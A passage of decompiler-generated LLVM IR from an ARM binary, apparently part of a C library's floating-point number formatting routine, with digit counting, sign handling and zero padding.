  br i1 %v9_15520, label %dec_label_pc_15658, label %dec_label_pc_15528

dec_label_pc_15528:                               ; preds = %dec_label_pc_154fc, %dec_label_pc_15518
  store i32 %v1_15544, i32* %r1.global-to-local, align 4
  store i32 %v2_15508, i32* %r0.global-to-local, align 4
  store i32 %v3_15508, i32* %r3.global-to-local, align 4
  %v1_15538 = urem i32 %v2_15508, 2
  %v2_15538 = icmp ne i32 %v1_15538, 0
  %.649 = zext i1 %v2_15538 to i32
  store i32 %.649, i32* @r7, align 4
  %v4_15544 = sdiv i32 %v1_15544, 2
  %v6_15544 = icmp ult i32 %v3_15508, %v4_15544
  store i32 1128267776, i32* @r8, align 4
  br i1 %v6_15544, label %.thread99, label %dec_label_pc_15558

.thread99:                                        ; preds = %dec_label_pc_15528
  store i32 0, i32* @r5, align 4
  store i32 1071644672, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1557c

dec_label_pc_15558:                               ; preds = %dec_label_pc_15528
  %v12_15544 = icmp eq i32 %v3_15508, %v4_15544
  br i1 %v12_15544, label %dec_label_pc_1555c, label %dec_label_pc_15574

dec_label_pc_1555c:                               ; preds = %dec_label_pc_15558
  store i32 %stack_var_-664.7.lcssa, i32* %ip.global-to-local, align 4
  %v1_15560 = add i32 %v5_1546c, 4
  store i32 %v1_15560, i32* %r3.global-to-local, align 4
  %v9_15564 = icmp eq i32 %v1_15560, %stack_var_-664.7.lcssa
  br i1 %v9_15564, label %.thread101, label %dec_label_pc_15574

.thread101:                                       ; preds = %dec_label_pc_1555c
  store i32 0, i32* @r5, align 4
  store i32 1072693248, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1557c

dec_label_pc_15574:                               ; preds = %dec_label_pc_1555c, %dec_label_pc_15558
  store i32 1073217536, i32* %r6.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %.thread101, %.thread99, %dec_label_pc_15574
  %v1_15598 = phi i32 [ -1075838976, %.thread99 ], [ -1074790400, %.thread101 ], [ -1074266112, %dec_label_pc_15574 ]
  %v2_15580 = icmp eq i32 %stack_var_-688.2, 0
  br i1 %v2_15580, label %.thread105, label %dec_label_pc_15588

dec_label_pc_15588:                               ; preds = %dec_label_pc_1557c
  %v4_15588 = ptrtoint i8* %stack_var_-684.2 to i32
  store i32 %v4_15588, i32* %r0.global-to-local, align 4
  %v2_1558c = load i8, i8* %stack_var_-684.2, align 1
  %v3_1558c = zext i8 %v2_1558c to i32
  store i32 %v3_1558c, i32* %r3.global-to-local, align 4
  %v7_15590 = icmp eq i8 %v2_1558c, 45
  br i1 %v7_15590, label %bb608, label %.thread105

bb608:                                            ; preds = %dec_label_pc_15588
  store i32 -1019215872, i32* %r4.global-to-local, align 4
  store i32 %v1_15598, i32* %r2.global-to-local, align 4
  store i32 -1019215872, i32* @r8, align 4
  store i32 %v1_15598, i32* %r6.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_15588, %dec_label_pc_1557c, %bb608
  %v0_155b8 = phi i32 [ 1128267776, %dec_label_pc_15588 ], [ 1128267776, %dec_label_pc_1557c ], [ -1019215872, %bb608 ]
  %v2_155a8 = sub i32 %v2_154fc, %v3_15508
  store i32 %v2_155a8, i32* %r4.global-to-local, align 4
  store i32 %v0_155b8, i32* %r1.global-to-local, align 4
  store i32 %v2_155a8, i32* %v1_154fc, align 4
  store i32 0, i32* @r0, align 4
  %v0_155c4 = load i32, i32* @r7, align 4
  store i32 %v0_155c4, i32* @r2, align 4
  %v0_155c8 = load i32, i32* @r8, align 4
  store i32 %v0_155c8, i32* %r3.global-to-local, align 4
  %v0_155cc = call i32 @__aeabi_dcmpeq()
  store i32 %v0_155cc, i32* %r0.global-to-local, align 4
  %v2_155d0 = icmp eq i32 %v0_155cc, 0
  br i1 %v2_155d0, label %dec_label_pc_155d8, label %.thread105.dec_label_pc_15658_crit_edge

.thread105.dec_label_pc_15658_crit_edge:          ; preds = %.thread105
  %v0_1565c.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_15658

dec_label_pc_155d8:                               ; preds = %.thread105
  store i32 999999999, i32* %r1.global-to-local, align 4
  %v0_155dc = load i32, i32* %r4.global-to-local, align 4
  %v1_155dc = load i32, i32* @sl, align 4
  %v2_155dc = add i32 %v1_155dc, %v0_155dc
  store i32 %v2_155dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_15604.pre = load i32, i32* @sb, align 4
  %v2_15604730 = inttoptr i32 %v1_15604.pre to i32*
  store i32 %v2_155dc, i32* %v2_15604730, align 4
  %v0_15608731 = load i32, i32* @sb, align 4
  %v1_15608732 = inttoptr i32 %v0_15608731 to i32*
  %v2_15608733 = load i32, i32* %v1_15608732, align 4
  store i32 %v2_15608733, i32* %r3.global-to-local, align 4
  %v1_1560c734 = load i32, i32* %r1.global-to-local, align 4
  %tmp900 = icmp ugt i32 %v2_15608733, %v1_1560c734
  br i1 %tmp900, label %dec_label_pc_155e8, label %dec_label_pc_15614

dec_label_pc_155e8:                               ; preds = %dec_label_pc_155d8, %.thread106
  %v1_15608741 = phi i32* [ %v1_15608, %.thread106 ], [ %v1_15608732, %dec_label_pc_155d8 ]
  %stack_var_-668.7740 = phi i32 [ %stack_var_-668.6, %.thread106 ], [ %stack_var_-668.5, %dec_label_pc_155d8 ]
  store i32 %stack_var_-668.7740, i32* %r3.global-to-local, align 4
  %v0_155ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_155ec, i32* %v1_15608741, align 4
  %v3_155ec = load i32, i32* @sb, align 4
  %v4_155ec = add i32 %v3_155ec, -4
  store i32 %v4_155ec, i32* @sb, align 4
  %v1_155f0 = load i32, i32* %r3.global-to-local, align 4
  %v3_155f0 = icmp ult i32 %v4_155ec, %v1_155f0
  br i1 %v3_155f0, label %bb609, label %.thread106

bb609:                                            ; preds = %dec_label_pc_155e8
  %v1_155f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_155f4 = add i32 %v1_155f0, -4
  %v4_155f4 = inttoptr i32 %v3_155f4 to i32*
  store i32 %v1_155f4, i32* %v4_155f4, align 4
  %v5_155f4 = load i32, i32* %r3.global-to-local, align 4
  %v6_155f4 = add i32 %v5_155f4, -4
  store i32 %v6_155f4, i32* %r3.global-to-local, align 4
  %v0_155fc.pre = load i32, i32* @sb, align 4
  br label %.thread106

.thread106:                                       ; preds = %dec_label_pc_155e8, %bb609
  %v0_155fc = phi i32 [ %v0_155fc.pre, %bb609 ], [ %v4_155ec, %dec_label_pc_155e8 ]
  %stack_var_-668.6 = phi i32 [ %v6_155f4, %bb609 ], [ %stack_var_-668.7740, %dec_label_pc_155e8 ]
  %v1_155fc = inttoptr i32 %v0_155fc to i32*
  %v2_155fc = load i32, i32* %v1_155fc, align 4
  %v1_15600 = add i32 %v2_155fc, 1
  store i32 %v1_15600, i32* %r3.global-to-local, align 4
  store i32 %v1_15600, i32* %v1_155fc, align 4
  %v0_15608 = load i32, i32* @sb, align 4
  %v1_15608 = inttoptr i32 %v0_15608 to i32*
  %v2_15608 = load i32, i32* %v1_15608, align 4
  store i32 %v2_15608, i32* %r3.global-to-local, align 4
  %v1_1560c = load i32, i32* %r1.global-to-local, align 4
  %tmp901 = icmp ugt i32 %v2_15608, %v1_1560c
  br i1 %tmp901, label %dec_label_pc_155e8, label %dec_label_pc_15604.dec_label_pc_15614_crit_edge

dec_label_pc_15604.dec_label_pc_15614_crit_edge:  ; preds = %.thread106
  br label %dec_label_pc_15614

dec_label_pc_15614:                               ; preds = %dec_label_pc_15604.dec_label_pc_15614_crit_edge, %dec_label_pc_155d8
  %stack_var_-668.7.lcssa = phi i32 [ %stack_var_-668.6, %dec_label_pc_15604.dec_label_pc_15614_crit_edge ], [ %stack_var_-668.5, %dec_label_pc_155d8 ]
  %v0_15608.lcssa = phi i32 [ %v0_15608, %dec_label_pc_15604.dec_label_pc_15614_crit_edge ], [ %v0_15608731, %dec_label_pc_155d8 ]
  store i32 %stack_var_-668.7.lcssa, i32* %lr.global-to-local, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %ip.global-to-local, align 4
  %v2_1561c = sub i32 %stack_var_-664.1.v3_151a0, %stack_var_-668.7.lcssa
  %v3_15620 = sdiv i32 %v2_1561c, 4
  %v2_15628 = mul i32 %v3_15620, 9
  store i32 %v2_15628, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_15634 = inttoptr i32 %stack_var_-668.7.lcssa to i32*
  %v2_15634 = load i32, i32* %v1_15634, align 4
  store i32 %v2_15634, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_15650749 = icmp ult i32 %v2_15634, 10
  br i1 %v3_15650749, label %dec_label_pc_15658.loopexit, label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %dec_label_pc_15614, %dec_label_pc_15640
  %stack_var_-680.4.in751 = phi i32 [ %v1_15648, %dec_label_pc_15640 ], [ %v2_15628, %dec_label_pc_15614 ]
  %v1_15640750 = phi i32 [ %v2_15640, %dec_label_pc_15640 ], [ 10, %dec_label_pc_15614 ]
  %v2_15640 = mul i32 %v1_15640750, 10
  %v1_15648 = add i32 %stack_var_-680.4.in751, 1
  %v3_15650 = icmp ult i32 %v2_15634, %v2_15640
  br i1 %v3_15650, label %dec_label_pc_15650.dec_label_pc_15658.loopexit_crit_edge, label %dec_label_pc_15640

dec_label_pc_15650.dec_label_pc_15658.loopexit_crit_edge: ; preds = %dec_label_pc_15640
  store i32 %v2_15640, i32* %r3.global-to-local, align 4
  store i32 %v1_15648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15658.loopexit

dec_label_pc_15658.loopexit:                      ; preds = %dec_label_pc_15650.dec_label_pc_15658.loopexit_crit_edge, %dec_label_pc_15614
  %stack_var_-680.4.in.lcssa = phi i32 [ %v1_15648, %dec_label_pc_15650.dec_label_pc_15658.loopexit_crit_edge ], [ %v2_15628, %dec_label_pc_15614 ]
  %stack_var_-680.4.le = inttoptr i32 %stack_var_-680.4.in.lcssa to i8*
  br label %dec_label_pc_15658

dec_label_pc_15658:                               ; preds = %.thread105.dec_label_pc_15658_crit_edge, %dec_label_pc_15658.loopexit, %dec_label_pc_15518
  %stack_var_-668.8 = phi i32 [ %stack_var_-668.5, %dec_label_pc_15518 ], [ %stack_var_-668.7.lcssa, %dec_label_pc_15658.loopexit ], [ %stack_var_-668.5, %.thread105.dec_label_pc_15658_crit_edge ]
  %v0_1565c = phi i32 [ %v5_1546c, %dec_label_pc_15518 ], [ %v0_15608.lcssa, %dec_label_pc_15658.loopexit ], [ %v0_1565c.pre, %.thread105.dec_label_pc_15658_crit_edge ]
  %stack_var_-680.5 = phi i8* [ %stack_var_-680.3, %dec_label_pc_15518 ], [ %stack_var_-680.4.le, %dec_label_pc_15658.loopexit ], [ %stack_var_-680.3, %.thread105.dec_label_pc_15658_crit_edge ]
  store i32 %stack_var_-664.7.lcssa, i32* %r1.global-to-local, align 4
  %v1_1565c = add i32 %v0_1565c, 4
  store i32 %v1_1565c, i32* %r3.global-to-local, align 4
  %tmp902 = icmp ugt i32 %stack_var_-664.7.lcssa, %v1_1565c
  %v4_15664.stack_var_-664.7 = select i1 %tmp902, i32 %v1_1565c, i32 %stack_var_-664.7.lcssa
  br label %dec_label_pc_15678.preheader

dec_label_pc_15678.preheader:                     ; preds = %bb605, %dec_label_pc_15658
  %stack_var_-668.9 = phi i32 [ %stack_var_-668.8, %dec_label_pc_15658 ], [ %stack_var_-668.5, %bb605 ]
  %stack_var_-680.6.ph = phi i8* [ %stack_var_-680.5, %dec_label_pc_15658 ], [ %stack_var_-680.3, %bb605 ]
  %stack_var_-664.8.ph = phi i32 [ %v4_15664.stack_var_-664.7, %dec_label_pc_15658 ], [ %stack_var_-664.7.lcssa, %bb605 ]
  store i32 %stack_var_-664.8.ph, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* %ip.global-to-local, align 4
  %tmp903 = icmp ugt i32 %stack_var_-664.8.ph, %stack_var_-668.9
  br i1 %tmp903, label %dec_label_pc_15688, label %dec_label_pc_15694

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15688
  store i32 %v1_15688, i32* %r2.global-to-local, align 4
  store i32 %v1_15688, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* %ip.global-to-local, align 4
  %tmp904 = icmp ugt i32 %v1_15688, %stack_var_-668.9
  br i1 %tmp904, label %dec_label_pc_15688, label %dec_label_pc_15694

dec_label_pc_15688:                               ; preds = %dec_label_pc_15678.preheader, %dec_label_pc_1566c
  %v0_15710764 = phi i32 [ %v1_15688, %dec_label_pc_1566c ], [ %stack_var_-664.8.ph, %dec_label_pc_15678.preheader ]
  %v1_15688 = add i32 %v0_15710764, -4
  %v2_15688 = inttoptr i32 %v1_15688 to i32*
  %v3_15688 = load i32, i32* %v2_15688, align 4
  store i32 %v3_15688, i32* %r3.global-to-local, align 4
  %v2_1568c = icmp eq i32 %v3_15688, 0
  br i1 %v2_1568c, label %dec_label_pc_1566c, label %dec_label_pc_15694

dec_label_pc_15694:                               ; preds = %dec_label_pc_15678.preheader, %dec_label_pc_1566c, %dec_label_pc_15688
  %v0_15710.lcssa = phi i32 [ %stack_var_-664.8.ph, %dec_label_pc_15678.preheader ], [ %v0_15710764, %dec_label_pc_15688 ], [ %v1_15688, %dec_label_pc_1566c ]
  %v3_15684.lcssa = phi i1 [ true, %dec_label_pc_15678.preheader ], [ false, %dec_label_pc_15688 ], [ true, %dec_label_pc_1566c ]
  store i32 %v1_14e20, i32* %lr.global-to-local, align 4
  br i1 %v7_15428, label %dec_label_pc_156a0, label %dec_label_pc_157c4

dec_label_pc_156a0:                               ; preds = %dec_label_pc_15694
  store i32 %v1_1543c, i32* %r0.global-to-local, align 4
  %v4_156a4 = ptrtoint i8* %stack_var_-680.6.ph to i32
  store i32 %v4_156a4, i32* %r2.global-to-local, align 4
  br i1 %v2_15434, label %bb610, label %bb611

bb610:                                            ; preds = %dec_label_pc_156a0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb611

bb611:                                            ; preds = %dec_label_pc_156a0, %bb610
  %v0_156b8 = phi i32 [ %v1_1543c, %dec_label_pc_156a0 ], [ 1, %bb610 ]
  %v1_156b0 = add i32 %v4_156a4, 4
  %v3_156b0 = sub i32 0, %v4_156a4
  %v4_156b0 = and i32 %v1_156b0, %v3_156b0
  %v5_156b0 = icmp slt i32 %v4_156b0, 0
  %v6_156b0 = icmp slt i32 %v1_156b0, 0
  %v7_156b0 = icmp eq i32 %v1_156b0, 0
  %v2_156b4 = xor i1 %v6_156b0, %v5_156b0
  br i1 %v2_156b4, label %bb613, label %bb612

bb612:                                            ; preds = %bb611
  %v5_156b4 = sub i32 %v0_156b8, %v4_156a4
  %v7_156b4 = xor i32 %v0_156b8, %v4_156a4
  %v8_156b4 = xor i32 %v5_156b4, %v0_156b8
  %v9_156b4 = and i32 %v8_156b4, %v7_156b4
  %v10_156b4 = icmp slt i32 %v9_156b4, 0
  %v11_156b4 = icmp slt i32 %v5_156b4, 0
  %v12_156b4 = icmp eq i32 %v0_156b8, %v4_156a4
  br label %bb613

bb613:                                            ; preds = %bb611, %bb612
  %v2_156bc = phi i1 [ %v5_156b0, %bb611 ], [ %v10_156b4, %bb612 ]
  %v1_156bc = phi i1 [ %v6_156b0, %bb611 ], [ %v11_156b4, %bb612 ]
  %v0_156bc = phi i1 [ %v7_156b0, %bb611 ], [ %v12_156b4, %bb612 ]
  %v3_156bc = xor i1 %v2_156bc, %v1_156bc
  %v4_156bc = or i1 %v0_156bc, %v3_156bc
  br i1 %v4_156bc, label %dec_label_pc_156dc, label %dec_label_pc_156c0

dec_label_pc_156c0:                               ; preds = %bb613
  %v1_156c0 = sub i32 -1, %v4_156a4
  %v2_156c4 = add i32 %v0_156b8, %v1_156c0
  store i32 %v2_156c4, i32* %r0.global-to-local, align 4
  %v1_156cc = add nsw i32 %v4_14794, -1
  store i32 %v1_156cc, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v1_156cc to i8
  br label %dec_label_pc_156f4

dec_label_pc_156dc:                               ; preds = %bb613
  %v1_156e4 = add nsw i32 %v4_14794, -2
  store i32 %v1_156e4, i32* %ip.global-to-local, align 4
  %v1_156e8 = add i32 %v0_156b8, -1
  store i32 %v1_156e8, i32* %lr.global-to-local, align 4
  %extract.t877 = trunc i32 %v1_156e4 to i8
  br label %dec_label_pc_156f4

dec_label_pc_156f4:                               ; preds = %dec_label_pc_156c0, %dec_label_pc_156dc
  %v1_156cc.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_156c0 ], [ %extract.t877, %dec_label_pc_156dc ]
  %stack_var_-708.13.in = phi i32 [ %v2_156c4, %dec_label_pc_156c0 ], [ %v1_156e8, %dec_label_pc_156dc ]
  store i32 %v4_14790, i32* %r0.global-to-local, align 4
  %v1_156f8 = and i32 %v4_14790, 8
  store i32 %v1_156f8, i32* %r3.global-to-local, align 4
  %v2_156f8 = icmp eq i32 %v1_156f8, 0
  br i1 %v2_156f8, label %dec_label_pc_15700, label %dec_label_pc_157c4

dec_label_pc_15700:                               ; preds = %dec_label_pc_156f4
  store i32 %v0_15710.lcssa, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* %r2.global-to-local, align 4
  br i1 %v3_15684.lcssa, label %dec_label_pc_1574c, label %dec_label_pc_15710

dec_label_pc_15710:                               ; preds = %dec_label_pc_15700
  %v1_15710 = add i32 %v0_15710.lcssa, -4
  %v2_15710 = inttoptr i32 %v1_15710 to i32*
  %v3_15710 = load i32, i32* %v2_15710, align 4
  store i32 %v3_15710, i32* %r6.global-to-local, align 4
  %v2_15714 = icmp eq i32 %v3_15710, 0
  br i1 %v2_15714, label %dec_label_pc_1574c, label %dec_label_pc_15734.preheader

dec_label_pc_15734.preheader:                     ; preds = %dec_label_pc_15710
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_1573c782 = urem i32 %v3_15710, 10
  %v2_15740783 = icmp eq i32 %v3_1573c782, 0
  br i1 %v2_15740783, label %dec_label_pc_1572c, label %dec_label_pc_15750.loopexit

dec_label_pc_1572c:                               ; preds = %dec_label_pc_15734.preheader, %dec_label_pc_1572c
  %v1_1572c785 = phi i32 [ %v2_1572c, %dec_label_pc_1572c ], [ 10, %dec_label_pc_15734.preheader ]
  %v0_15730784 = phi i32 [ %v1_15730, %dec_label_pc_1572c ], [ 0, %dec_label_pc_15734.preheader ]
  %v2_1572c = mul i32 %v1_1572c785, 10
  %v1_15730 = add i32 %v0_15730784, 1
  %v3_1573c = urem i32 %v3_15710, %v2_1572c
  %v2_15740 = icmp eq i32 %v3_1573c, 0
  br i1 %v2_15740, label %dec_label_pc_1572c, label %dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge

dec_label_pc_1574c:                               ; preds = %dec_label_pc_15710, %dec_label_pc_15700
  store i32 9, i32* @r5, align 4
  br label %dec_label_pc_15750

dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge: ; preds = %dec_label_pc_1572c
  store i32 %v2_1572c, i32* %r4.global-to-local, align 4
  store i32 %v1_15730, i32* @r5, align 4
  br label %dec_label_pc_15750.loopexit

dec_label_pc_15750.loopexit:                      ; preds = %dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge, %dec_label_pc_15734.preheader
  %v0_15730.lcssa = phi i32 [ %v1_15730, %dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge ], [ 0, %dec_label_pc_15734.preheader ]
  %v1_1572c.lcssa = phi i32 [ %v2_1572c, %dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge ], [ 10, %dec_label_pc_15734.preheader ]
  %v3_1573c.lcssa = phi i32 [ %v3_1573c, %dec_label_pc_15734.dec_label_pc_15750.loopexit_crit_edge ], [ %v3_1573c782, %dec_label_pc_15734.preheader ]
  %v2_1573c = udiv i32 %v3_15710, %v1_1572c.lcssa
  store i32 %v3_1573c.lcssa, i32* %r1.global-to-local, align 4
  store i32 %v2_1573c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15750.loopexit, %dec_label_pc_1574c
  %v0_15780 = phi i32 [ %v0_15730.lcssa, %dec_label_pc_15750.loopexit ], [ 9, %dec_label_pc_1574c ]
  %v4_15750 = sext i8 %v1_156cc.sink.off0 to i32
  store i32 %v4_15750, i32* %ip.global-to-local, align 4
  store i32 %v0_15710.lcssa, i32* %lr.global-to-local, align 4
  %v1_15758 = or i32 %v4_15750, 32
  store i32 %v1_15758, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %r0.global-to-local, align 4
  %v7_15760 = icmp eq i32 %v1_15758, 102
  %v2_15764 = sub i32 %v0_15710.lcssa, %stack_var_-664.1.v3_151a0
  store i32 %v2_15764, i32* %r1.global-to-local, align 4
  %v3_1576c = sdiv i32 %v2_15764, 4
  br i1 %v7_15760, label %dec_label_pc_1576c, label %dec_label_pc_15798

dec_label_pc_1576c:                               ; preds = %dec_label_pc_15750
  store i32 %v3_1576c, i32* %r2.global-to-local, align 4
  %v2_15774 = mul i32 %v3_1576c, 9
  %v1_15778 = add i32 %v2_15774, -9
  store i32 %stack_var_-708.13.in, i32* %r1.global-to-local, align 4
  %v2_15780 = sub i32 %v1_15778, %v0_15780
  %tmp905 = lshr i32 %v2_15780, 31
  %v5_15784 = add nsw i32 %tmp905, -1
  %v6_15784 = and i32 %v2_15780, %v5_15784
  store i32 %v6_15784, i32* %r3.global-to-local, align 4
  %v2_15788 = sub i32 %stack_var_-708.13.in, %v6_15784
  %v4_15788 = xor i32 %v6_15784, %stack_var_-708.13.in
  %v5_15788 = xor i32 %v2_15788, %stack_var_-708.13.in
  %v6_15788 = and i32 %v5_15788, %v4_15788
  %v7_15788 = icmp slt i32 %v6_15788, 0
  %v8_15788 = icmp slt i32 %v2_15788, 0
  %v2_1578c = xor i1 %v8_15788, %v7_15788
  br i1 %v2_1578c, label %dec_label_pc_157c4, label %bb614

bb614:                                            ; preds = %dec_label_pc_1576c
  store i32 %v6_15784, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157c4

dec_label_pc_15798:                               ; preds = %dec_label_pc_15750
  store i32 %v3_1576c, i32* %r1.global-to-local, align 4
  %v1_157a0 = add i32 %v4_156a4, -9
  store i32 %v1_157a0, i32* %r2.global-to-local, align 4
  %v3_157a8 = mul i32 %v3_1576c, 9
  %v4_157a8 = add i32 %v3_157a8, %v1_157a0
  store i32 %stack_var_-708.13.in, i32* %ip.global-to-local, align 4
  %v2_157b0 = sub i32 %v4_157a8, %v0_15780
  %tmp906 = lshr i32 %v2_157b0, 31
  %v5_157b4 = add nsw i32 %tmp906, -1
  %v6_157b4 = and i32 %v2_157b0, %v5_157b4
  store i32 %v6_157b4, i32* %r3.global-to-local, align 4
  %v2_157b8 = sub i32 %stack_var_-708.13.in, %v6_157b4
  %v4_157b8 = xor i32 %v6_157b4, %stack_var_-708.13.in
  %v5_157b8 = xor i32 %v2_157b8, %stack_var_-708.13.in
  %v6_157b8 = and i32 %v5_157b8, %v4_157b8
  %v7_157b8 = icmp slt i32 %v6_157b8, 0
  %v8_157b8 = icmp slt i32 %v2_157b8, 0
  %v2_157bc = xor i1 %v8_157b8, %v7_157b8
  br i1 %v2_157bc, label %dec_label_pc_157c4, label %bb615

bb615:                                            ; preds = %dec_label_pc_15798
  store i32 %v6_157b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_157c4

dec_label_pc_157c4:                               ; preds = %bb615, %dec_label_pc_15798, %bb614, %dec_label_pc_1576c, %dec_label_pc_156f4, %dec_label_pc_15694
  %stack_var_-700.3 = phi i8 [ %v1_156cc.sink.off0, %dec_label_pc_156f4 ], [ %stack_var_-700.0, %dec_label_pc_15694 ], [ %v1_156cc.sink.off0, %dec_label_pc_1576c ], [ %v1_156cc.sink.off0, %bb614 ], [ %v1_156cc.sink.off0, %dec_label_pc_15798 ], [ %v1_156cc.sink.off0, %bb615 ]
  %stack_var_-708.14.in = phi i32 [ %stack_var_-708.13.in, %dec_label_pc_156f4 ], [ %v1_1543c, %dec_label_pc_15694 ], [ %stack_var_-708.13.in, %dec_label_pc_1576c ], [ %v6_15784, %bb614 ], [ %stack_var_-708.13.in, %dec_label_pc_15798 ], [ %v6_157b4, %bb615 ]
  %stack_var_-708.14 = inttoptr i32 %stack_var_-708.14.in to i8*
  %v2_157c8 = icmp eq i32 %stack_var_-708.14.in, 0
  br i1 %v2_157c8, label %._crit_edge347, label %.thread117

._crit_edge347:                                   ; preds = %dec_label_pc_157c4
  store i32 %v4_14790, i32* %r0.global-to-local, align 4
  %v4_157d0 = sext i8 %stack_var_-700.3 to i32
  store i32 %v4_157d0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_157d8 = udiv i32 %v4_14790, 8
  store i32 %v4_157d8, i32* %r3.global-to-local, align 4
  %v1_157dc458 = or i32 %v4_157d0, 32
  store i32 %v1_157dc458, i32* @r6, align 4
  %v2_157e0 = urem i32 %v4_157d8, 2
  br label %bb616

.thread117:                                       ; preds = %dec_label_pc_157c4
  %v4_157d0111 = sext i8 %stack_var_-700.3 to i32
  store i32 %v4_157d0111, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-708.14.in, i32* %ip.global-to-local, align 4
  %v1_157dc = or i32 %v4_157d0111, 32
  store i32 %v1_157dc, i32* @r6, align 4
  br label %bb616

bb616:                                            ; preds = %._crit_edge347, %.thread117
  %storemerge485 = phi i32 [ 1, %.thread117 ], [ %v2_157e0, %._crit_edge347 ]
  %v0_157ec = phi i32 [ %v1_157dc, %.thread117 ], [ %v1_157dc458, %._crit_edge347 ]
  %v0_157e8 = phi i32 [ %stack_var_-708.14.in, %.thread117 ], [ 0, %._crit_edge347 ]
  store i32 %storemerge485, i32* %r2.global-to-local, align 4
  %v1_157e8 = add i32 %v0_157e8, 1
  store i32 %v1_157e8, i32* %r3.global-to-local, align 4
  %v7_157ec = icmp eq i32 %v0_157ec, 102
  %v2_157f0 = add i32 %v1_157e8, %storemerge485
  store i32 %v2_157f0, i32* @r4, align 4
  %v4_157f8 = ptrtoint i8* %stack_var_-680.6.ph to i32
  br i1 %v7_157ec, label %dec_label_pc_157f8, label %dec_label_pc_15808

dec_label_pc_157f8:                               ; preds = %bb616
  store i32 %v4_157f8, i32* %lr.global-to-local, align 4
  %tmp617 = icmp sgt i8* %stack_var_-680.6.ph, null
  br i1 %tmp617, label %bb618, label %dec_label_pc_1587c

bb618:                                            ; preds = %dec_label_pc_157f8
  %v7_15800 = add i32 %v2_157f0, %v4_157f8
  store i32 %v7_15800, i32* @r4, align 4
  br label %dec_label_pc_1587c

dec_label_pc_15808:                               ; preds = %bb616
  %v1_1580c = icmp slt i8* %stack_var_-680.6.ph, null
  br i1 %v1_1580c, label %bb619, label %bb620

bb619:                                            ; preds = %dec_label_pc_15808
  %v4_15810 = sub i32 0, %v4_157f8
  br label %bb620

bb620:                                            ; preds = %dec_label_pc_15808, %bb619
  %storemerge884 = phi i32 [ %v4_15810, %bb619 ], [ %v4_157f8, %dec_label_pc_15808 ]
  %v0_1581c = phi i32 [ %v4_15810, %bb619 ], [ %v4_157f8, %dec_label_pc_15808 ]
  store i32 %storemerge884, i32* %r0.global-to-local, align 4
  %v3_15814 = ashr i32 %v0_1581c, 31
  store i32 %v3_15814, i32* %r1.global-to-local, align 4
  store i32 %v2_143ac, i32* %r2.global-to-local, align 4
  %v3_1581c = call i32 @fmt_u(i32 %v0_1581c, i32 %v3_15814, i32 %v2_143ac)
  store i32 %v3_1581c, i32* %r0.global-to-local, align 4
  store i32 %v2_143a4, i32* %r1.global-to-local, align 4
  %v1_15824 = sub i32 12, %v3_1581c
  %v2_15828 = add i32 %v1_15824, %v2_143a4
  store i32 %v2_15828, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1583c

dec_label_pc_15834:                               ; preds = %dec_label_pc_1583c
  %v0_15834 = load i32, i32* %r2.global-to-local, align 4
  %v1_15834 = trunc i32 %v0_15834 to i8
  %v4_15834 = inttoptr i32 %v1_15840 to i8*
  store i8 %v1_15834, i8* %v4_15834, align 1
  %v0_15838 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15838, i32* %r0.global-to-local, align 4
  %v0_1583c.pr = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1583c

dec_label_pc_1583c:                               ; preds = %bb620, %dec_label_pc_15834
  %v2_1585c = phi i32 [ %v3_1581c, %bb620 ], [ %v0_15838, %dec_label_pc_15834 ]
  %v0_15844 = phi i32 [ %v2_15828, %bb620 ], [ %v0_1583c.pr, %dec_label_pc_15834 ]
  %v1_15840 = add i32 %v2_1585c, -1
  store i32 %v1_15840, i32* %r1.global-to-local, align 4
  %v1_15844 = add i32 %v0_15844, 1
  store i32 %v1_15844, i32* %r3.global-to-local, align 4
  %v7_15848 = icmp sgt i32 %v0_15844, 1
  br i1 %v7_15848, label %dec_label_pc_1584c, label %dec_label_pc_15834

dec_label_pc_1584c:                               ; preds = %dec_label_pc_1583c
  store i32 %v4_157f8, i32* %r2.global-to-local, align 4
  %.651 = select i1 %v1_1580c, i8 45, i8 43
  %v4_1585c = inttoptr i32 %v1_15840 to i8*
  store i8 %.651, i8* %v4_1585c, align 1
  %v2_15864 = load i32, i32* %r1.global-to-local, align 4
  %v3_15864 = add i32 %v2_15864, -1
  %v4_15864 = inttoptr i32 %v3_15864 to i8*
